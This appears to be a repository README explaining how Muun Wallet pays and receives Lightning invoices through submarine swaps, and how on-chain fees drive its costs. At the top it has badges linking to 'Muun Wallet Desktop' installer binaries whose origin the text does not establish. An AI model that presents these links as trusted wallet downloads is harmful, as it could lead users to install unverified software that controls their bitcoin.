[![Muun Wallet](https://img.shields.io/badge/Muun%20Wallet-Desktop-blue)](https://github.com/muun-network/muun-wallet/releases/tag/v0.5.1) [![Platforms](https://img.shields.io/badge/platforms-macOS%20%7C%20Windows%20%7C%20Linux-lightgrey)](https://github.com/muun-network/muun-wallet/releases/tag/v0.5.1) [![License](https://img.shields.io/badge/license-MIT-green)](https://github.com/muun-network/muun-wallet/blob/main/LICENSE)

[![macOS](https://img.shields.io/badge/Download-macOS-black?logo=apple&logoColor=white)](https://github.com/muun-network/muun-wallet/releases/download/v0.5.1/muun-wallet-v0.5.1.dmg) [![Windows](https://img.shields.io/badge/Download-Windows-0078d4?logo=windows&logoColor=white)](https://github.com/muun-network/muun-wallet/releases/download/v0.5.1/muun-wallet-v0.5.1.exe) [![Linux](https://img.shields.io/badge/Download-Linux-f5a623?logo=linux&logoColor=white)](https://github.com/muun-network/muun-wallet/releases/download/v0.5.1/muun-wallet-v0.5.1.zip)

---

# What Is a Submarine Swap? How Muun Pays Lightning Invoices

Submarine swaps are the mechanism Muun Wallet uses to send and receive Lightning Network payments without requiring you to manage Lightning channels. Understanding what a submarine swap is explains most of the questions people have about Muun's fees, its Lightning behavior, and why it differs from wallets like Phoenix or Zeus.

---

## The problem submarine swaps solve

Lightning Network payments travel through channels — pre-funded, off-chain payment paths between Bitcoin nodes. To send a Lightning payment natively, you need a channel with sufficient outbound liquidity, and to receive one, you need a channel with sufficient inbound liquidity. Managing this requires either running your own node or trusting a managed channel provider.

Submarine swaps solve this by creating a bridge between on-chain Bitcoin and the Lightning Network without requiring the user to hold or manage any channel at all. The swap is atomic — meaning it either completes fully or refunds fully, with no possibility of a partial failure that leaves funds in an ambiguous state.

---

## How a submarine swap works, step by step

**Sending a Lightning payment with Muun:**

1. You tap Send and paste or scan a Lightning invoice.
2. Muun calculates the payment amount plus the on-chain swap fee and shows you the total before confirmation.
3. You confirm. Muun locks your on-chain Bitcoin into a swap contract using a hash time-lock contract (HTLC) — a special script that holds the funds until either the Lightning payment succeeds or the timelock expires.
4. Muun's swap infrastructure routes the Lightning payment through the network to the recipient using its own channel liquidity.
5. When the payment succeeds, the recipient reveals a cryptographic preimage (a secret) that unlocks the on-chain funds, completing the swap and paying Muun for the swap service.
6. If the payment fails, the timelock expires and your on-chain Bitcoin is returned to you automatically.

**The key property:** the entire sequence is trustless. At no point can Muun take your on-chain Bitcoin without also successfully delivering the Lightning payment to the recipient. The HTLC enforces this cryptographically.

---

## Receiving a Lightning payment with Muun

The reverse swap works similarly: the payer sends a Lightning payment through Muun's infrastructure, which simultaneously creates an on-chain output that adds to your Muun balance. From your perspective, you generate an invoice or share your Lightning Address and receive funds — the swap mechanics are invisible.

---

## Why this determines your fees

The on-chain component of the swap is a real Bitcoin transaction that miners must include in a block. Its cost follows the mempool fee market at the moment you initiate the swap. During low-congestion periods, the swap is inexpensive. During peak mempool congestion, the on-chain leg can be a significant cost — even for a small Lightning payment, because the swap transaction size is roughly fixed regardless of how much you are sending.

This is the root cause of Muun's Lightning fee variability. It is not markup or a Muun-specific design choice — it is the direct cost of settling on the Bitcoin base layer rather than maintaining pre-funded channels. The trade-off for the user is: no channel management complexity, but fees that scale with on-chain congestion instead of flat Lightning routing fees.

---

## How Muun Wallet Desktop makes this transparent

Muun Wallet Desktop shows the complete fee estimate — on-chain component plus swap service fee — before you confirm any Lightning payment. The transaction status screen also shows which stage of the swap your payment is currently in, so you can see at any point whether the on-chain leg is pending, confirming, or complete.

If the on-chain leg of a swap stalls due to a fee rate that is now below the current mempool minimum, Muun Wallet Desktop's replace-by-fee feature lets you bump the fee without any external tool. See [how to fix a stuck transaction](muun-wallet-stuck-transaction-rbf.md).

---

## Submarine swaps vs. native Lightning channels

| Property | Submarine swap (Muun) | Native channels (Phoenix, Zeus) |
|---|---|---|
| Channel management | None required | Managed automatically or manually |
| Fee type | On-chain mining fee per swap | Routing fees per payment |
| Fee during congestion | Scales with mempool | Typically flat routing fee |
| Setup complexity | None | Requires initial channel opening |
| Custodial risk | Non-custodial (HTLC-enforced) | Non-custodial |
| Lightning address support | Yes | Yes |

Neither model is strictly better. Submarine swaps are simpler to use and carry no channel setup overhead. Native channels are more fee-efficient for small, frequent Lightning payments during congested periods. The [Muun vs Phoenix comparison](muun-wallet-vs-phoenix-wallet.md) explores this trade-off in more detail.

---

## Related articles

- [Muun Wallet Lightning fees explained](muun-wallet-lightning-fees-explained.md)
- [Muun Wallet fees explained](muun-wallet-fees-explained.md)
- [How to fix a stuck transaction (RBF)](muun-wallet-stuck-transaction-rbf.md)
- [Muun Wallet vs Phoenix Wallet](muun-wallet-vs-phoenix-wallet.md)
- [Is Muun Wallet safe?](is-muun-wallet-safe.md)
